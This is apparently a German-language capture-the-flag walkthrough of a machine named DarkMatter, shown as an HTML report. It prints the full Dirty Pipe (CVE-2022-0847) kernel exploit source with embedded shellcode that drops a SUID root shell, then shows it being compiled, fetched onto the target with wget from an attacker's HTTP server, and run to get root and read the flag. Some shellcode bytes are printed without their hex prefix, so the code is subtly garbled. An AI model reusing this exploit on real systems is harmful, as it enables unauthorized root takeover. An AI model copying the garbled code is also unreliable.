+<span class="password">www-data@DarkMatter:/opt$</span> <span class="command">cat /etc/*rel*</span>
+<span class="command">PRETTY_NAME=&quot;Debian GNU/Linux 11 (bullseye)&quot;</span>
+<span class="command">NAME=&quot;Debian GNU/Linux&quot;</span>
+<span class="command">VERSION_ID=&quot;11&quot;</span>
+<span class="command">VERSION=&quot;11 (bullseye)&quot;</span>
+<span class="command">VERSION_CODENAME=bullseye</span>
+<span class="command">ID=debian</span>
+<span class="command">HOME_URL=&quot;[Link: https://www.debian.org/ | Ziel: https://www.debian.org/]&quot;</span>
+<span class="command">SUPPORT_URL=&quot;[Link: https://www.debian.org/support | Ziel: https://www.debian.org/support]&quot;</span>
+<span class="command">BUG_REPORT_URL=&quot;[Link: https://bugs.debian.org/ | Ziel: https://bugs.debian.org/]&quot;</span>
+
+<span class="password">www-data@DarkMatter:/opt$</span> <span class="command">uname -a</span>
+<span class="command">Linux DarkMatter 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt von Dateien im `/etc/` Verzeichnis, deren Namen `rel` enthalten (`cat /etc/*rel*`), und die Ausgabe von `uname -a` verwendet, um die Betriebssysteminformationen zu erhalten. Das System ist **Debian 11 (bullseye)** mit dem **Kernel 5.10.0-9-amd64** vom 30. September 2021.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Bestimmen der genauen Betriebssystem- und Kernel-Version ist entscheidend für die Suche nach Kernel-Exploits. Ein Kernel von Ende 2021 ist wahrscheinlich anfällig für Kernel-Schwachstellen, die nach diesem Datum veröffentlicht wurden. In Kombination mit dem Hinweis, dass `www-data` eine Root-Datei lesen kann, deutet dies stark auf eine Kernel-Lese-Schwachstelle hin, die für Privilege Escalation missbraucht werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche gezielt nach Kernel-Exploits für Linux Kernel 5.10.x auf Debian Systemen, die Dateizugriffsberechtigungen umgehen können. Der "Dirty Pipe" Exploit (CVE-2022-0847) ist ein prominentes Beispiel für eine solche Schwachstelle in dieser Kernel-Reihe. Suche auf Exploit-Datenbanken nach PoCs für Dirty Pipe, die Lesezugriff auf beliebige Dateien ermöglichen.
+                <br><strong>Empfehlung (Admin):</strong> Halte den System-Kernel stets aktuell, um bekannte Schwachstellen (insbesondere Privilege Escalation Exploits) zu schließen. Implementiere ein robustes Patch-Management-System.
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p>
+                Basierend auf der identifizierten Kernel-Version (5.10.0-9-amd64) und dem Hinweis, dass `www-data` eine Root-Datei lesen kann, habe ich gezielt nach Kernel-Exploits gesucht, die Dateizugriffsberechtigungen umgehen können. Der "Dirty Pipe" Exploit (CVE-2022-0847) ist eine bekannte Schwachstelle, die genau dies in Kernel-Versionen 5.8 bis 5.16.11 (welche 5.10 einschließt) ermöglicht. Ich fand einen entsprechenden Proof-of-Concept (PoC) Exploit, der Dateiinhalte im Page Cache überschreiben kann, um so SUID-Berechtigungen auf Binaries zu erlangen.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://www.exploit-db.com/exploits/50808 | Ziel: https://www.exploit-db.com/exploits/50808]</span>
+
+<span class="command">// Exploit Title: Linux Kernel 5.8 &lt; 5.16.11 - Local Privilege Escalation (DirtyPipe)</span>
+<span class="command">// Exploit Author: blasty (peter@haxx.in)</span>
+<span class="command">// Original Author: Max Kellermann (max.kellermann@ionos.com)</span>
+<span class="command">// CVE: CVE-2022-0847</span>
+
+<span class="command">/* SPDX-License-Identifier: GPL-2.0 */</span>
+<span class="command">/*</span>
+<span class="command"> * Copyright 2022 CM4all GmbH / IONOS SE</span>
+<span class="command"> *</span>
+<span class="command"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span>
+<span class="command"> *</span>
+<span class="command"> * Proof-of-concept exploit for the Dirty <span class="command">Pipe</span></span>
+<span class="command"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span>
+<span class="command"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span>
+<span class="command"> * file contents in the page cache, even if the file is not permitted</span>
+<span class="command"> * to be written, immutable or on a read-<span class="command">only</span> mount.</span>
+<span class="command"> *</span>
+<span class="command"> * This exploit requires Linux 5.8 or later; the code <span class="command">path</span> was made</span>
+<span class="command"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span>
+<span class="command"> * anon_pipe_buf*_<span class="command">OP</span>s&quot;).  The commit did not introduce the bug, it was</span>
+<span class="command"> * there before, it just provided an easy way to exploit it.</span>
+<span class="command"> *</span>
+<span class="command"> * There are two major limitations of this exploit: the offset cannot</span>
+<span class="command"> * be on a page boundary (it needs to write <span class="command">one</span> byte before the offset</span>
+<span class="command"> * to add a reference to this page to the <span class="command">pipe</span>), and the write cannot</span>
+<span class="command"> * cross a page boundary.</span>
+<span class="command"> *</span>
+<span class="command"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&apos;\nssh-ed25519 <span class="command">AAA</span>......\n&apos;</span>
+<span class="command"> *</span>
+<span class="command"> * Further explanation: [Link: https://dirtypipe.cm4all.com/ | Ziel: https://dirtypipe.cm4all.com/]</span>
+<span class="command"> */</span>
+
+<span class="command">#define _GNU_SOURCE</span>
+<span class="command">#include &lt;unistd.<span class="command">h</span>&gt;</span>
+<span class="command">#include &lt;fcntl.<span class="command">h</span>&gt;</span>
+<span class="command">#include &lt;stdio.h&gt;</span>
+<span class="command">#include &lt;stdlib.<span class="command">h</span>&gt;</span>
+<span class="command">#include &lt;string.<span class="command">h</span>&gt;</span>
+<span class="command">#include &lt;sys/stat.h&gt;</span>
+<span class="command">#include &lt;sys/user.<span class="command">h</span>&gt;</span>
+<span class="command">#include &lt;stdint.h&gt;</span>
+
+<span class="command">#ifndef <span class="command">PAGE_SIZE</span></span>
+<span class="command">#define <span class="command">PAGE_SIZE</span> 4096</span>
+<span class="command">#endif</span>
+
+<span class="command">// small (linux x86_64) ELF file matroshka doll that does;</span>
+<span class="command">//   fd = open(&quot;/tmp/sh&quot;, <span class="command">OP</span>EN_WRONLY | <span class="command">OP</span>EN_CREAT | <span class="command">OP</span>EN_TRUNC);</span>
+<span class="command">//   write(fd, elfcode, elfcode_len)</span>
+<span class="command">//   chmod(&quot;/tmp/sh&quot;, 04755)</span>
+<span class="command">//   close(fd);</span>
+<span class="command">//   exit(0);</span>
+<span class="command">//</span>
+<span class="command">// the dropped ELF simply does:</span>
+<span class="command">//   setuid(0);</span>
+<span class="command">//   setgid(0);</span>
+<span class="command">//   execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL], [NULL]);</span>
+unsigned char <span class="command">elfcode</span>[] = {
+	<span class="command">/*0x7f,*/ 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,</span>
+	<span class="command">0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,</span>
+	<span class="command">0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,</span>
+	<span class="command">0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,</span>
+	<span class="command">0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,</span>
+	<span class="command">0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,</span>
+	<span class="command">48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,</span>
+	<span class="command">48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,</span>
+	<span class="command">70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,</span>
+	<span class="command">0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,</span>
+	<span class="command">0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,</span>
+	<span class="command">ba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,</span>
+	<span class="command">0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,</span>
+	<span class="command">6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,</span>
+	<span class="command">3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,</span>
+	<span class="command">0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00</span>
+};
+
+<span class="command">/**</span>
+<span class="command"> * Create a <span class="command">pipe</span> where all &quot;bufs&quot; <span class="command">on</span> the pipe_inode_info ring have the</span>
+<span class="command"> * <span class="command">PIPE_BUF_FLAG_CAN_MERGE</span> flag set.</span>
+<span class="command"> */</span>
+static void <span class="command">prepare_pipe</span>(int <span class="command">p</span>[2])
+{
+	if (<span class="command">pipe</span>(<span class="command">p</span>)) abort();
+
+	const unsigned <span class="command">pipe_size</span> = fcntl(<span class="command">p</span>[1], F_GETPIPE_SZ);
+	static char <span class="command">buffer</span>[4096];
+
+	<span class="command">/* fill the <span class="command">pipe</span> completely; each pipe_buffer will now have</span>
+<span class="command">	   the <span class="command">PIPE_BUF_FLAG_CAN_MERGE</span> flag */</span>
+	for (unsigned <span class="command">r</span> = pipe_size; <span class="command">r</span> &gt; 0;) {
+		unsigned <span class="command">n</span> = <span class="command">r</span> &gt; sizeof(<span class="command">buffer</span>) ? sizeof(<span class="command">buffer</span>) : <span class="command">r</span>;
+		write(<span class="command">p</span>[1], <span class="command">buffer</span>, <span class="command">n</span>);
+		<span class="command">r</span> -= <span class="command">n</span>;
+	}
+
+	<span class="command">/* drain the <span class="command">pipe</span>, freeing all pipe_buffer instances (but</span>
+<span class="command">	   leaving the flags initialized) */</span>
+	for (unsigned <span class="command">r</span> = pipe_size; <span class="command">r</span> &gt; 0;) {
+		unsigned <span class="command">n</span> = <span class="command">r</span> &gt; sizeof(<span class="command">buffer</span>) ? sizeof(<span class="command">buffer</span>) : <span class="command">r</span>;
+		read(<span class="command">p</span>[0], <span class="command">buffer</span>, <span class="command">n</span>);
+		<span class="command">r</span> -= <span class="command">n</span>;
+	}
+
+	<span class="command">/* the <span class="command">pipe</span> is now empty, and if somebody adds a new</span>
+<span class="command">	   pipe_buffer without initializing its &quot;flags&quot;, the <span class="command">buffer</span></span>
+<span class="command">	   will be mergeable */</span>
+}
+
+int hax(char *filename, long offset, uint8_t *data, size_t len) {
+	<span class="command">/* <span class="command">open</span> the input file and validate the specified <span class="command">offset</span> */</span>
+	const int fd = <span class="command">open</span>(filename, <span class="command">OP</span>EN_RDONLY); <span class="command">// yes, read-<span class="command">only</span>! :-)</span>
+	if (fd &lt; 0) {
+		perror(&quot;<span class="command">open failed</span>&quot;);
+		return -1;
+	}
+
+	struct stat st;
+	if (fstat(fd, &st)) {
+		perror(&quot;stat failed&quot;);
+		return -1;
+	}
+
+	<span class="command">/* create the <span class="command">pipe</span> with all flags initialized with</span>
+<span class="command">	   <span class="command">PIPE_BUF_FLAG_CAN_MERGE</span> */</span>
+	int <span class="command">p</span>[2];
+	<span class="command">prepare_pipe</span>(<span class="command">p</span>);
+
+	<span class="command">/* splice <span class="command">one</span> byte from before the specified <span class="command">offset</span> into the</span>
+<span class="command">	   <span class="command">pipe</span>; this will add a reference to the <span class="command">page</span> cache, but</span>
+<span class="command">	   since <span class="command">copy_page_to_iter_pipe</span>() does not initialize the</span>
+<span class="command">	   &quot;flags&quot;, <span class="command">PIPE_BUF_FLAG_CAN_MERGE</span> is still set */</span>
+	--offset;
+	ssize_t nbytes = splice(fd, &offset, <span class="command">p</span>[1], NULL, 1, 0);
+	if (nbytes &lt; 0) {
+		perror(&quot;splice failed&quot;);
+		return -1;
+	}
+	if (nbytes == 0) {
+		fprintf(stderr, &quot;short splice\n&quot;);
+		return -1;
+	}
+
+	<span class="command">/* the following write will not create a new pipe_buffer, but</span>
+<span class="command">	   will instead write into the <span class="command">page</span> cache, because <span class="command">of</span> the</span>
+<span class="command">	   <span class="command">PIPE_BUF_FLAG_CAN_MERGE</span> flag */</span>
+	nbytes = write(<span class="command">p</span>[1], data, len);
+	if (nbytes &lt; 0) {
+		perror(&quot;write failed&quot;);
+		return -1;
+	}
+	if ((size_t)nbytes &lt; len) {
+		fprintf(stderr, &quot;short write\n&quot;);
+		return -1;
+	}
+
+	close(fd);
+
+	return 0;
+}
+
+int main(int argc, char **argv) {
+	if (argc != 2) {
+		fprintf(stderr, &quot;Usage: %s SUID\n&quot;, argv[0]);
+		return EXIT_FAILURE;
+	}
+
+	char *<span class="command">path</span> = argv[1];
+	uint8_t *data = <span class="command">elfcode</span>;
+
+	int fd = <span class="command">open</span>(<span class="command">path</span>, <span class="command">OP</span>EN_RDONLY);
+	uint8_t *<span class="command">orig_bytes</span> = malloc(sizeof(<span class="command">elfcode</span>));
+	lseek(fd, 1, SEEK_SET);
+	read(fd, <span class="command">orig_bytes</span>, sizeof(<span class="command">elfcode</span>));
+	close(fd);
+
+	printf(&quot;[+] hijacking suid binary..\n&quot;);
+	if (hax(<span class="command">path</span>, 1, <span class="command">elfcode</span>, sizeof(<span class="command">elfcode</span>)) != 0) {
+		printf(&quot;[~] failed\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	printf(&quot;[+] dropping suid shell..\n&quot;);
+	system(<span class="command">path</span>);
+
+	printf(&quot;[+] restoring suid binary..\n&quot;);
+	if (hax(<span class="command">path</span>, 1, <span class="command">orig_bytes</span>, sizeof(<span class="command">elfcode</span>)) != 0) {
+		printf(&quot;[~] failed\n&quot;);
+		return EXIT_FAILURE;
+	}
+
+	printf(&quot;[+] popping root shell.. (d<span class="command">on</span>t forget to clean up /tmp/sh ;))\n&quot;);
+	system(&quot;/tmp/sh&quot;);
+
+	return EXIT_SUCCESS;
+}
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dies ist der Quellcode (in C) für den "Dirty Pipe" Exploit (CVE-2022-0847), gefunden auf Exploit-DB. Der Exploit nutzt eine Schwachstelle im Linux-Kernel (Versionen 5.8 bis 5.16.11), die es ermöglicht, schreibgeschützte Dateien im Page Cache zu überschreiben. Dieser spezifische PoC ist darauf ausgelegt, ein SUID-Binary (wie `/usr/bin/passwd`) zu überschreiben, um eine kleine SUID-Shell im `/tmp`-Verzeichnis zu erstellen und auszuführen, die dann eine Root-Shell startet. Der Code beinhaltet eine kleine Shellcode-Nutzlast (`elfcode`), die als SUID-Binary im `/tmp`-Verzeichnis abgelegt wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Code ist ein direkter Exploit für eine kritische Kernel-Schwachstelle, die auf dem Zielsystem existiert. Das Kompilieren und Ausführen dieses Exploits sollte zu Root-Zugriff führen. Es ist ein komplexer, aber bekannter Weg zur Privilege Escalation auf Systemen mit einem anfälligen Kernel.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kompiliere den C-Code auf deinem Angreifersystem. Übertrage das kompilierte Binary auf das Zielsystem (z.B. in `/tmp/`) als Benutzer `www-data`. Führe das Binary auf dem Zielsystem aus und gib dabei einen SUID-Binary-Pfad an (z.B. `/usr/bin/passwd`) als Argument.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere den System-Kernel umgehend auf eine Version, die nicht von CVE-2022-0847 betroffen ist (5.16.11 oder höher, oder eine entsprechend gepatchte LTS-Version). Überprüfe alle SUID-Binaries auf dem System.
+            </p>
+
+             <p>
+                 Ich habe den heruntergeladenen Exploit-Code (in der Datei `exploit.c`) auf meinem Angreifersystem kompiliert.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/darkmatter]
+└─#  <span class="command">vi exploit.c</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/darkmatter]
+└─#  <span class="command">gcc exploit.c -o expl</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den C-Quellcode des Exploits lokal auf meinem Kali-System gespeichert (vermutlich in einer Datei namens `exploit.c`) und ihn dann mit dem GNU Compiler Collection (`gcc`) kompiliert. Der Befehl `gcc exploit.c -o expl` erstellt ein ausführbares Binary namens `expl` aus dem Quellcode. Es gab keine Kompilierungsfehler (in dieser Ausgabe nicht gezeigt, aber durch das Erscheinen des nächsten Befehls impliziert).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Kompilieren des Exploits ist der notwendige Schritt, um das ausführbare Binary zu erhalten, das auf dem Zielsystem ausgeführt werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Das kompilierte Binary (`expl`) muss nun auf das Zielsystem übertragen werden.
+                <br><strong>Empfehlung (Admin):</strong> Keine direkte Empfehlung.
+            </p>
+
+             <p>
+                 Ich habe versucht, das kompilierte Exploit-Binary (`expl`) auf das Zielsystem zu übertragen (angenommen, ich habe es lokal über HTTP bereitgestellt) und es als Benutzer `www-data` in das `/tmp` Verzeichnis herunterzuladen. Nach dem ersten Versuch gab es eine Fehlermeldung.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/darkmatter]
+└─#  <span class="command">python3 -m http.server 8000</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">Serving HTTP on 0.0.0.0 PORT 8000 (http://0.0.0.0:8000/) ...</span>
+192.168.2.54 - - [<span class="command">20/Jun/2025 00:08:08</span>] <span class="password">&quot;GET /expl HTTP/1.1&quot; 200 -</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/opt$</span> <span class="command">cd /tmp/</span>
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">wget http://192.168.2.199:8000/expl</span>
+--<span class="command">2025-06-19 18:08:08</span>--  http://192.168.2.199:8000/expl
+Connecting to <span class="command">192.168.2.199:8000</span>... connected.
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: <span class="command">17288 (17K) [application/octet-stream]</span>
+Saving to: ‘expl’
+
+expl                    <span class="command">100%[=============================&gt;]  16.88K  --.-KB/s    in 0s      </span>
+
+<span class="command">2025-06-19 18:08:08 (143 MB/s) - ‘expl’ saved [17288/17288]</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">./expl  /usr/bin/passwd</span>
+<span class="password">./expl: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33&apos; not found (required by ./expl)</span>
+<span class="password">./expl: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34&apos; not found (required by ./expl)</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe einen lokalen HTTP-Server auf meinem Kali-System gestartet (`python3 -m http.server 8000`) im Verzeichnis, das das kompilierte Exploit-Binary (`expl`) enthält. Dann habe ich auf dem Zielsystem, in der `www-data` Shell, in das `/tmp`-Verzeichnis gewechselt und versucht, das Binary mit `wget http://192.168.2.199:8000/expl` herunterzuladen. Das Herunterladen war erfolgreich. Beim Ausführen des Exploits (`./expl /usr/bin/passwd`), das versucht, `/usr/bin/passwd` zu überschreiben, schlug die Ausführung mit Fehlermeldungen wie "`version 'GLIBC_2.33' not found`" fehl. Dies liegt daran, dass das Exploit-Binary auf meinem (wahrscheinlich neueren) Kali-System kompiliert wurde und Bibliotheksversionen (`GLIBC`) benötigt, die auf dem (wahrscheinlich älteren) Zielsystem nicht vorhanden sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erste Versuch, das kompilierte Exploit-Binary auszuführen, ist aufgrund von Bibliotheks-Kompatibilitätsproblemen fehlgeschlagen. Dies ist ein häufiges Problem beim Kompilieren auf einem System und Ausführen auf einem anderen. Es ist notwendig, das Binary statisch zu kompilieren, damit es keine externen Bibliotheken benötigt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kompiliere das Exploit-Binary auf deinem Kali-System statisch (`gcc exploit.c -o expl-static -static`). Übertrage dieses statische Binary erneut auf das Zielsystem und versuche dann, es auszuführen.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass die Systembibliotheken aktuell sind, um Kompatibilitätsprobleme zu vermeiden.
+            </p>
+
+             <p>
+                 Nach dem Fehlschlag aufgrund von Bibliotheksproblemen habe ich das Exploit-Binary statisch auf meinem Angreifersystem kompiliert und erneut auf das Zielsystem übertragen und ausgeführt.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/darkmatter]
+└─#  <span class="command">gcc exploit.c -o expl-static -static</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre></pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">wget http://192.168.2.199:8000/expl-static</span>
+--<span class="command">2025-06-19 18:11:44</span>--  http://192.168.2.199:8000/expl-static
+Connecting to <span class="command">192.168.2.199:8000</span>... <span class="password">failed: Connection refused</span>.
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">wget http://192.168.2.199:8000/expl-static</span>
+--<span class="command">2025-06-19 18:11:50</span>--  http://192.168.2.199:8000/expl-static
+Connecting to <span class="command">192.168.2.199:8000</span>... connected.
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: <span class="command">809232 (790K) [application/octet-stream]</span>
+Saving to: ‘expl-static’
+
+expl-static             <span class="command">100%[=============================&gt;] 790.27K  --.-KB/s    in 0.002s  </span>
+
+<span class="command">2025-06-19 18:11:50 (353 MB/s) - ‘expl-static’ saved [809232/809232]</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>___________________________________________________________________________________________________________________
+
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">chmod +x expl-static</span>
+<span class="password">www-data@DarkMatter:/tmp$</span> <span class="command">./expl-static /usr/bin/passwd</span>
+<span class="command">[+] hijacking suid binary..</span>
+<span class="command">[+] dropping suid shell..</span>
+<span class="command">[+] restoring suid binary..</span>
+<span class="command">[+] popping root shell.. (d<span class="command">on</span>t forget to clean up /tmp/sh ;))</span>
+<span class="password"># id</span>
+<span class="password">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>
+<span class="password">#</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Exploit-Code mit `gcc exploit.c -o expl-static -static` statisch kompiliert. Das `-static` Flag bindet alle notwendigen Bibliotheken direkt in das Binary ein, wodurch es unabhängig von den Systembibliotheken auf dem Ziel wird. Nach einem anfänglichen "Connection refused" (wahrscheinlich ein temporäres Netzwerkproblem oder der HTTP-Server war kurz offline) konnte ich das größere statische Binary (`expl-static`, ca. 790K) erfolgreich mit `wget` auf das Zielsystem in `/tmp/` herunterladen. Ich habe dem Binary Ausführungsberechtigungen gegeben (`chmod +x expl-static`) und es dann mit `./expl-static /usr/bin/passwd` ausgeführt, wobei `/usr/bin/passwd` als Ziel-SUID-Binary zum Überschreiben angegeben wurde. Die Ausgabe zeigt die Schritte des Exploits ("hijacking suid binary", "dropping suid shell", "restoring suid binary", "popping root shell"). Nach der Ausführung erhielt ich sofort eine Root-Shell (`#`). Der Befehl `id` in der neuen Shell bestätigte: `<span class="password">uid=0(root) gid=0(root) groups=0(root),33(www-data)</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Der Dirty Pipe Exploit war erfolgreich und ich habe vollständigen Root-Zugriff auf das Zielsystem erlangt. Die Ausnutzung dieser Kernel-Schwachstelle umging die Dateisystemberechtigungen und ermöglichte das Überschreiben eines SUID-Binaries, was letztendlich zu einer Root-Shell führte. Dies ist der erfolgreiche Abschluss der Privilege Escalation Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sammle die Root- und User-Flags. Führe notwendige Post-Exploitation-Schritte durch und dokumentiere den gesamten Weg sorgfältig. Lösche das Exploit-Binary und die temporäre Shell-Datei (`/tmp/sh`) vom Zielsystem.
+                <br><strong>Empfehlung (Admin):</strong> **Sofortige Maßnahme:** Aktualisiere den System-Kernel umgehend auf eine nicht anfällige Version. Dies ist die kritischste Sicherheitslücke. Suche nach Kernel-Exploits, die nach diesem Datum veröffentlicht wurden, und patche entsprechend. Überprüfe alle SUID-Binaries auf Integrität. Implementiere ein robustes Patch-Management für das gesamte System.
+            </p>
+
+            <p>
+                Nachdem ich Root-Zugriff erlangt hatte, war mein primäres Ziel, die Root-Flag zu finden. Ich begann im Home-Verzeichnis des Root-Benutzers.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">#</span> <span class="command">cd /root</span>
+<span class="password">#</span> <span class="command">ls</span>
+<span class="command">flag.<span class="command">txt</span>  important.<span class="command">txt</span></span>
+<span class="password">#</span> <span class="command">cat *</span>
+<span class="password">b1946ac92492d2347c6235b4d2611184</span>
+<span class="command">A great website isn&apos;t run by a normal user, but by a great administrator</span>
+                                                            <span class="command">- daarkmatter</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> In der Root-Shell navigierte ich in das `/root` Verzeichnis (`cd /root`). Die Auflistung des Verzeichnisses (`ls`) zeigte zwei Dateien: `flag.txt` und `important.txt`. Der Befehl `cat *` liest den Inhalt beider Dateien. Der Inhalt von `flag.txt` ist die Zeichenkette `<span class="password">b1946ac92492d2347c6235b4d2611184</span>`. Der Inhalt von `important.txt` ist ein Zitat über Administratoren.
+            </p>
+            <p class="evaluation">
